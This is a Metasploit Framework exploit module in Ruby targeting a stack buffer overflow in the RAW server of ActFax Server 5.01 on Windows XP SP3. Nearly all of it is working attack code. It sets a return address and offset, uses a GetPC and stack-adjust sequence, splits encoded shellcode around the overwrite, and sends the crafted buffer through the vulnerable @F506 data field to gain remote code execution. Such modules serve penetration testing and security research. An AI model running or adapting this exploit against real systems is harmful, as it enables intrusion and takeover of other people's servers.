##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking
	include Msf::Exploit::Remote::Tcp
	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'ActFax 5.01 RAW Server Buffer Overflow',
			'Description'	=> %q{
					This module exploits a vulnerability in ActFax Server 5.01 RAW server. The RAW Server can 
					be used to transfer fax messages to the fax server without any underlying protocols. To 
					note significant fields in the fax being transfered, like fax number and receipient, you can 
					use ActFax data fields. @F506,@F605, and @F000 are all data fields that are vulnerable. 
					For more information refer to the 'data fields' section of the help menu in ActFax. This has 
					been fixed in a beta version which wont be pushed to release until May 2013. 
					Beta is here: http://www.actfax.com/download/beta/actfax_setup_en.exe
					
			},
			'License'		=> MSF_LICENSE,
			'Author'		=>
				[
					'Craig Freyman @cd1zz',	#discovery and msf
					'corelanc0d3r', #lots of help with getpc routine => https://www.corelan-training.com/index.php/training/corelan-live
				],
			'References'	=>
				[
					[ 'OSVDB', '' ],
					[ 'CVE', '' ],
					[ 'URL', 'http://www.pwnag3.com/2013/02/actfax-raw-server-exploit.html' ]
				],
			'DefaultOptions' =>
				{
					'ExitFunction' => 'none', 
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'	=> 'win',
			'Payload'	=>
				{
					'BadChars' => "\x00\x40",
					'DisableNops' => true,
					'Space' => 1000,
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
                    			'EncoderOptions' => { 'BufferRegister' => 'EBX' }
      		            
				},

			'Targets'		=>
				[
					[ 'Windows XP SP3',
						{
							'Ret'   	=>	0x775e3422, #ole32.dll v5.1.2600.6168
							'Offset'	=>	1024
						}
					],
				],
			'Privileged'	=> false,
			'DisclosureDate'	=> 'Feb 5 2013',
			'DefaultTarget'	=> 0))

		register_options([Opt::RPORT(0)], self.class)

	end

	def exploit
		
		connect	
			
		getpc = "\xe8\xff\xff\xff\xff\xc3\x5b" #ebx|  call + 4: 
		add_ebx = "\x83\xc3\x20" #add ebx,32 
		fill = "\x4b" * 5 #inc ebx 5 times
		fill2 = "\x90" * 17 
		stack_adjust = "\x81\xc4\x24\xfa\xff\xff" #add esp,-1500
		shell_chunk1 = payload.encoded[0,522]
		shell_chunk2 = payload.encoded[522,payload.encoded.length-522] 
			
		buffer = ""
		buffer << shell_chunk2
		buffer << rand_text_alpha(target['Offset']-buffer.length)
		buffer << [target.ret].pack('V')
		buffer << stack_adjust	
		buffer << getpc 
		buffer << add_ebx 
		buffer << fill 
		buffer << fill2 
		buffer << shell_chunk1
				
		print_status("Trying target #{target.name}...")
		sock.put("@F506 "+buffer+"@\r\npwnag3\r\n\r\n")

		handler
		disconnect

	end
end

